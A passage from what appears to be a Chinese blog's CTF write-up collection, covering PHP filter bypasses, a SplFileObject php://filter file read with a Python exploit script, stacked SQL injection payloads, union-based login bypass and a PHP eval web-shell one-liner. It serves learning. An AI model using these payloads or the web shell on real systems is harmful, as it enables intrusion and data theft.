class=\"line\"><span class=\"variable\">$shell</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;shell&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$shell</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第一部分-2\"><a href=\"#第一部分-2\" class=\"headerlink\" title=\"第一部分\"></a>第一部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$emp</span>!=<span class=\"string\">&quot;114514&quot;</span>&amp;&amp;<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$emp</span>,<span class=\"number\">0</span>)===<span class=\"number\">114514</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$emp</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">ctype_alpha</span>(<span class=\"variable\">$emp</span>[<span class=\"variable\">$i</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"非法字符转化规则\"><a href=\"#非法字符转化规则\" class=\"headerlink\" title=\"非法字符转化规则\"></a>非法字符转化规则</h4><p>e_m.p -&gt;e[m.p</p>\n<h4 id=\"intval和ctype-alpha绕过\"><a href=\"#intval和ctype-alpha绕过\" class=\"headerlink\" title=\"intval和ctype_alpha绕过\"></a>intval和ctype_alpha绕过</h4><p><strong>GET: e[m.p&#x3D;114514.1</strong> </p>\n<blockquote>\n<p>114514a会被ctype_alpha检查，不可用</p>\n</blockquote>\n<h3 id=\"第二部分-2\"><a href=\"#第二部分-2\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/.+?HACKER/is&#x27;</span>,<span class=\"variable\">$try</span>))&#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$try</span>,<span class=\"string\">&#x27;HACKER&#x27;</span>) === <span class=\"literal\">TRUE</span>)&#123;</span><br><span class=\"line\">       <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你连自己是hacker都不承认，还想要flag呢？&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"preg-match和-stripos组合！！！长度绕过\"><a href=\"#preg-match和-stripos组合！！！长度绕过\" class=\"headerlink\" title=\"preg_match和!stripos组合！！！长度绕过\"></a>preg_match和!stripos组合！！！长度绕过</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=<span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">b=<span class=\"string\">&#x27;HACKER&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(a*<span class=\"number\">1000001</span>+b)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>ps:长度绕过一般为一百万位，建议使用bp重发器发送</p>\n</blockquote>\n<h3 id=\"第三部分-1\"><a href=\"#第三部分-1\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"variable\">$a</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$b</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$c</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$b</span>,<span class=\"string\">&#x27;php&#x27;</span>)!==<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;收手吧hacker，你得不到flag的！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> (<span class=\"keyword\">new</span> <span class=\"variable\">$a</span>(<span class=\"variable\">$b</span>))-&gt;<span class=\"variable\">$c</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;114514到底是啥意思嘞？。？&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"PHP原生类之SplFileObject\"><a href=\"#PHP原生类之SplFileObject\" class=\"headerlink\" title=\"PHP原生类之SplFileObject\"></a>PHP原生类之SplFileObject</h4><p><strong>GET:a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-</strong><br><strong>encode&#x2F;resource&#x3D;flag.php&amp;c&#x3D;__toString</strong></p>\n<blockquote>\n<p>c&#x3D;__toString是让echo触发__toString方法</p>\n</blockquote>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">res = requests.post(<span class=\"string\">&quot;http://gz.imxbt.cn:20214/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php&amp;c=__tostring&quot;</span>, data=&#123;<span class=\"string\">&#x27;try&#x27;</span>: <span class=\"string\">&#x27;-&#x27;</span> * <span class=\"number\">1000001</span> + <span class=\"string\">&#x27;HACKER&#x27;</span>&#125;)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res.text)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h1><h2 id=\"预处理-SQL\"><a href=\"#预处理-SQL\" class=\"headerlink\" title=\"预处理 SQL\"></a>预处理 SQL</h2><h3 id=\"强网杯-2019-随便注\"><a href=\"#强网杯-2019-随便注\" class=\"headerlink\" title=\"[强网杯 2019]随便注\"></a>[强网杯 2019]随便注</h3><p><a href=\"https://www.nssctf.cn/problem/17\">https://www.nssctf.cn/problem/17</a></p>\n<h3 id=\"思路一预处理-SQL\"><a href=\"#思路一预处理-SQL\" class=\"headerlink\" title=\"思路一预处理 SQL\"></a>思路一预处理 SQL</h3><p>预处理流程</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165848084.png\" alt=\"image-20241031165848084\">                             </p>\n<p>Payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">prepare stmt from @sql;</span><br><span class=\"line\"></span><br><span class=\"line\">execute stmt;</span><br></pre></td></tr></table></figure>\n\n<p>**concat()**的用法 若没定义，则默认用 逗号 来拼接字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p>**在上方语句中 是将 ‘se’**和 **’lect * from <code>1919810931114514</code>;’**两个字符串拼接</p>\n<p>查询语句 **select * from <code>1919810931114514</code>; **</p>\n<p><strong>从而绕过关键字过滤</strong></p>\n<p><strong>回显</strong> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165855608.png\" alt=\"image-20241031165855608\"></p>\n<p><strong>Strstr()</strong> 查找字符串<strong>第一次出现</strong> 查询资料可发现 </p>\n<p>该函数<strong>对大小写敏感</strong> 因此可以利用<strong>大小写绕过</strong></p>\n<p>最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">Set @sql=CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">pRepare stmt from @sql;</span><br><span class=\"line\"></span><br><span class=\"line\">execute stmt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>最后解释一下为什么要用预定义sql</strong></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165903645.png\" alt=\"image-20241031165903645\"></p>\n<h3 id=\"思路二-猜测原语句-修改表名\"><a href=\"#思路二-猜测原语句-修改表名\" class=\"headerlink\" title=\"思路二 猜测原语句 修改表名\"></a>思路二 猜测原语句 修改表名</h3><p><strong>堆叠注入输入show tables;之后发现我们当前所处的数据库中只有两张表</strong></p>\n<p>Show columns from <code>1919810931114514</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Show columns from `1919810931114514`</span><br></pre></td></tr></table></figure>\n\n<p>查询字段发现<strong>flag在1919810931114514</strong>中</p>\n<p><strong>即可反推出</strong>当前页面查询的是<strong>words表</strong></p>\n<p>sql语句便是 <strong>select data from <code>words</code> where id &#x3D;$inject</strong></p>\n<p><strong>既然可以堆叠注入 将表名改动即可</strong></p>\n<p><strong>Payload:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rename table `words` to `ttt`;</span><br><span class=\"line\"></span><br><span class=\"line\">rename table `1919810931114514` to `words`;</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE words ADD id int(10) DEFAULT &#x27;12&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">alert table `words` change `flag` `data` varchar(100);</span><br><span class=\"line\"></span><br><span class=\"line\">show columns from `words`;</span><br></pre></td></tr></table></figure>\n\n<p>ALTER TABLE <strong>tiger (表名)</strong> CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</p>\n<p>最后查询 1’ or ‘1&#x3D;1</p>\n<h3 id=\"思路三-handler代替select\"><a href=\"#思路三-handler代替select\" class=\"headerlink\" title=\"思路三 handler代替select\"></a>思路三 handler代替select</h3><p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165931763.png\" alt=\"image-20241031165931763\"></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%933/image-20241031165936604.png\" alt=\"image-20241031165936604\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1&#x27;;</span><br><span class=\"line\">handler `1919810931114514` open;</span><br><span class=\"line\">handler `1919810931114514` read first;-- +</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"sql与代码审计\"><a href=\"#sql与代码审计\" class=\"headerlink\" title=\"sql与代码审计\"></a>sql与代码审计</h2><h3 id=\"GXYCTF-2019-BabySqli\"><a href=\"#GXYCTF-2019-BabySqli\" class=\"headerlink\" title=\"[GXYCTF 2019]BabySqli\"></a>[GXYCTF 2019]BabySqli</h3><p> <a href=\"https://www.nssctf.cn/problem/1093\">https://www.nssctf.cn/problem/1093</a> </p>\n<p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5 </p>\n<p>解密后</p>\n<p>select * from user where username &#x3D; ‘$name’</p>\n<p>提示我们先注入<strong>用户名</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; union select 1,2,3 #测出字段数是3</span><br><span class=\"line\">1&#x27; union select &#x27;admin&#x27;,2,3# 判断用户所在列 返回wrong user</span><br><span class=\"line\">1&#x27; union select 1,&#x27;admin&#x27;,3 #返回wrong pass</span><br></pre></td></tr></table></figure>\n\n<p>得出了admin用户在第二列</p>\n<h3 id=\"查看源码\"><a href=\"#查看源码\" class=\"headerlink\" title=\"查看源码\"></a>查看源码</h3><p>根据提示查看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$arr</span>[<span class=\"number\">1</span>] == <span class=\"string\">&quot;admin&quot;</span>)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$password</span>) == <span class=\"variable\">$arr</span>[<span class=\"number\">2</span>])&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">&quot;wrong pass!&quot;</span>);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现是密码输入框的值进行md5加密进行匹配</p>\n<h3 id=\"测试密码字段\"><a href=\"#测试密码字段\" class=\"headerlink\" title=\"测试密码字段\"></a>测试密码字段</h3><p>所以到此需要猜想那一个字段是密码</p>\n<p>一般来说，2是用户，3就是密码，进行测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1’union select 1,‘admin’,‘e10adc3949ba59abbe56e057f20f883e’# //第三个字段是123456的MD5加密格式</span><br><span class=\"line\">123456 #密码框输入</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n","text":"JWT令牌伪造JSON Web Token HFCTF2020 EasyLoginhttps://buuoj.cn/challenges#[HFCTF2020]...","permalink":"/post/赛题总结3","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[],"tags":[{"name":"赛题","slug":"赛题","count":3,"path":"api/tags/赛题.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0\"><span class=\"toc-text\">JWT令牌伪造</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#JSON-Web-Token\"><span class=\"toc-text\">JSON Web Token</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#HFCTF2020-EasyLogin\"><span class=\"toc-text\">HFCTF2020 EasyLogin</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-ikun\"><span class=\"toc-text\">CISCN2019 华北赛区 ikun</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#RCE\"><span class=\"toc-text\">RCE</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%BD%AF%E9%93%BE%E6%8E%A5-ln-s\"><span class=\"toc-text\">软链接  ln -s</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CISCN2023-Unzip\"><span class=\"toc-text\">CISCN2023 Unzip</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#unzip\"><span class=\"toc-text\">unzip</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E8%BF%87%E6%B3%A8%E9%87%8A\"><span class=\"toc-text\">换行符绕过注释</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7\"><span class=\"toc-text\">牢牢记住，逝者为大</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%B8%80-%E5%8F%8D%E5%BC%B9shell\"><span class=\"toc-text\">思路一 反弹shell</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">思路二 远程下载木马</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%AB%E8%BF%9B%E5%88%B6%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4-%E7%A7%BB%E4%BD%8D%E6%9E%84%E9%80%A0%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">八进制构造命令 移位构造二进制命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ezRCE\"><span class=\"toc-text\">ezRCE</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#hex2bin%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A016%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">hex2bin函数构造16进制命令</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CISCN2024\"><span class=\"toc-text\">CISCN2024</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#simple-php\"><span class=\"toc-text\">simple php</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%90%E8%A1%8Cphp%E4%BB%A3%E7%A0%81\"><span class=\"toc-text\">命令行运行php代码</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%9E%84%E9%80%A016%E8%BF%9B%E5%88%B6%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">构造16进制命令</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93\"><span class=\"toc-text\">连接数据库</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#shell-exec%E6%97%A0%E5%9B%9E%E6%98%BE%E5%A4%96%E5%B8%A6\"><span class=\"toc-text\">shell_exec无回显外带</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%90%AC%E4%B8%8D%E8%A7%81%E6%88%91%E7%9A%84%E5%A3%B0%E9%9F%B3\"><span class=\"toc-text\">听不见我的声音</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#cmd-%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">$(cmd)  反引号的利用</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Bypass\"><span class=\"toc-text\">Bypass</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sizeof-POST-%E2%80%98len%E2%80%99-sizeof-array\"><span class=\"toc-text\">sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#basectf\"><span class=\"toc-text\">basectf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%A9%E5%8E%9F%E7%A5%9E%E7%8E%A9%E7%9A%84\"><span class=\"toc-text\">玩原神玩的</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第一部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#sizeof-POST-%E2%80%98len%E2%80%99-sizeof-array-1\"><span class=\"toc-text\">sizeof($_POST[‘len’]) &#x3D;&#x3D; sizeof($array)</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第二部分</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86\"><span class=\"toc-text\">第三部分</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#url-%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99\"><span class=\"toc-text\">url@解析规则</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#basectf-1\"><span class=\"toc-text\">basectf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Aura%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9\"><span class=\"toc-text\">Aura酱的礼物</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">第一部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#data-%E5%86%99%E5%85%A5\"><span class=\"toc-text\">data:&#x2F;&#x2F;写入</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">第二部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#url-%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99-1\"><span class=\"toc-text\">url@解析规则</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">解法一</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%A7%A3%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">解法二</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%80%E7%BB%88payload\"><span class=\"toc-text\">最终payload</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php%E5%8E%9F%E7%94%9F%E7%B1%BB1\"><span class=\"toc-text\">php原生类1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#basectf-2\"><span class=\"toc-text\">basectf</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F\"><span class=\"toc-text\">flag直接读取不就行了？</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php%E5%8E%9F%E7%94%9F%E7%B1%BB2\"><span class=\"toc-text\">php原生类2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1z-php\"><span class=\"toc-text\">1z_php</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">第一部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9D%9E%E6%B3%95%E5%AD%97%E7%AC%A6%E8%BD%AC%E5%8C%96%E8%A7%84%E5%88%99\"><span class=\"toc-text\">非法字符转化规则</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#intval%E5%92%8Cctype-alpha%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">intval和ctype_alpha绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-2\"><span class=\"toc-text\">第二部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#preg-match%E5%92%8C-stripos%E7%BB%84%E5%90%88%EF%BC%81%EF%BC%81%EF%BC%81%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">preg_match和!stripos组合！！！长度绕过</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-1\"><span class=\"toc-text\">第三部分</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E4%B9%8BSplFileObject\"><span class=\"toc-text\">PHP原生类之SplFileObject</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SQL\"><span class=\"toc-text\">SQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%A2%84%E5%A4%84%E7%90%86-SQL\"><span class=\"toc-text\">预处理 SQL</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8\"><span class=\"toc-text\">[强网杯 